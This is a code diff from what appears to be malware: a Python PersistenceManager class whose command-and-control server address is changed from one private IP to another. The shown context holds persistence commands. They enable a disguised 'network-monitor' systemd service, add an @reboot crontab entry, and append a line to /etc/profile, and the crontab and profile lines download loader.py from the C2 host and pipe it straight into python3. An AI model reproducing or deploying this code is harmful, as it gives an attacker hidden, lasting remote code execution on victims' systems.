@@ -10,7 +10,7 @@ import time
 
 class PersistenceManager:
     def __init__(self):
-        self.c2_server = "http://192.168.1.167:8000"
+        self.c2_server = "http://192.168.1.151:8000"
     
     def check_all_persistence(self):
         """Verify all persistence mechanisms are active"""
@@ -64,7 +64,7 @@ class PersistenceManager:
             "systemctl enable network-monitor.service 2>/dev/null || true",
             "systemctl start network-monitor.service 2>/dev/null || true",
             "(crontab -l 2>/dev/null | grep -v 'loader.py'; echo '@reboot curl -s http://192.168.1.167:8000/loader.py | python3 -') | crontab -",
-            "echo 'curl -s http://192.168.1.167:8000/loader.py | python3 - &' >> /etc/profile"
+            "echo 'curl -s http://192.168.1.151:8000/loader.py | python3 - &' >> /etc/profile"
         ]
         
         for script in scripts:
